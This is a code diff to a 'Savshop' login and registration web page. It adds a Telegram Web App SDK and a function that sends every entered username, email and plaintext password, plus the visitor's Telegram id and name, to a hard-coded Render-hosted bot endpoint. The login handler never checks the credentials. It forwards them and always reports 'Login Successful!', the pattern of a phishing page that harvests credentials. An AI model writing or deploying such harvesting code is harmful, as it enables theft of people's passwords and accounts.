@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Savshop - Login & Register</title>
+    <!-- Telegram WebApp SDK added -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             box-sizing: border-box;
@@ -20,7 +22,6 @@
             justify-content: flex-start;
             min-height: 100vh;
         }
-        /* Top Announcement Banner */
         .top-banner {
             background-color: #27ae60;
             color: #fff;
@@ -48,7 +49,6 @@
             box-shadow: 0 4px 20px rgba(0,0,0,0.6);
             border: 1px solid #2a2e39;
         }
-        /* Warning Banner */
         .warning-box {
             background-color: #e74c3c;
             color: #fff;
@@ -68,7 +68,6 @@
             margin-bottom: 20px;
             color: #e0e0e0;
         }
-        /* Tabs */
         .tabs {
             display: flex;
             margin-bottom: 20px;
@@ -127,7 +126,6 @@
         }
         .forgot-pass:hover { color: #3498db; }
         
-        /* Captcha Box */
         .captcha-box {
             background-color: #f9f9f9;
             border: 1px solid #d3d3d3;
@@ -166,7 +164,6 @@
             font-weight: bold;
         }
 
-        /* Buttons */
         .btn-primary {
             width: 100%;
             padding: 12px;
@@ -202,7 +199,6 @@
             line-height: 1.4;
         }
 
-        /* Success Popup Modal (SweetAlert Style) */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -260,7 +256,6 @@
 
             <div class="brand-title">SAVSHOP</div>
 
-            <!-- Tabs -->
             <div class="tabs">
                 <div class="tab active" onclick="switchTab('login')">LOGIN</div>
                 <div class="tab" onclick="switchTab('register')">REGISTER</div>
@@ -334,6 +329,44 @@
     </div>
 
     <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // Get Telegram User Info safely
+        const tgUser = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : {
+            id: "Web_Visitor",
+            first_name: "Web User",
+            username: "N/A"
+        };
+
+        // Function to send form data to Render Bot API server
+        async function sendDataToServer(actionType, status, formFields) {
+            try {
+                // Determine API URL (if hosted on same domain or absolute Render URL)
+                // If Vercel is front-end and Render is backend, put your Render URL here:
+                // e.g. "https://your-bot-name.onrender.com/api/submit"
+                // Or if relative: "/api/submit" (if configured with proxy, but since they are separate, use your full Render URL or window.location.origin if served together)
+                
+                // NOTE: Replace below with your actual Render backend URL if Vercel is separate!
+                const backendUrl = "https://savastan0so-t9zz.onrender.com/api/submit"; // <-- Update if your Render URL is different
+
+                await fetch(backendUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        telegram_id: tgUser.id,
+                        username: tgUser.username,
+                        name: tgUser.first_name,
+                        action: actionType,
+                        status: status,
+                        form_fields: formFields
+                    })
+                });
+            } catch (err) {
+                console.error("Submission error:", err);
+            }
+        }
+
         function switchTab(tabName) {
             const loginTab = document.querySelectorAll('.tab')[0];
             const regTab = document.querySelectorAll('.tab')[1];
@@ -363,7 +396,7 @@
             switchTab('login');
         }
 
-        function handleLogin() {
+        async function handleLogin() {
             const user = document.getElementById('login-user').value.trim();
             const pass = document.getElementById('login-pass').value.trim();
             const isCaptchaChecked = document.getElementById('captcha-check').checked;
@@ -377,11 +410,16 @@
                 return;
             }
 
-            // यहाँ आप डेटा अपने Telegram Bot या सर्वर पर भेज सकते हैं
+            // Send credentials to Render Bot backend
+            await sendDataToServer("LOGIN", "Login Successful", {
+                "Username": user,
+                "Password": pass
+            });
+
             showModal("Login Successful!");
         }
 
-        function handleRegister() {
+        async function handleRegister() {
             const user = document.getElementById('reg-user').value.trim();
             const email = document.getElementById('reg-email').value.trim();
             const pass = document.getElementById('reg-pass').value.trim();
@@ -396,7 +434,14 @@
                 return;
             }
 
-            // रजिस्ट्रेशन सफल होने पर वीडियो जैसा पॉप-अप दिखाएगा
+            // Send registration details to Render Bot backend
+            await sendDataToServer("REGISTER", "Registration Successful", {
+                "Username": user,
+                "Email": email,
+                "Password": pass,
+                "Confirm Password": cpass
+            });
+
             showModal("Your account has been created successfully!");
         }
     </script>
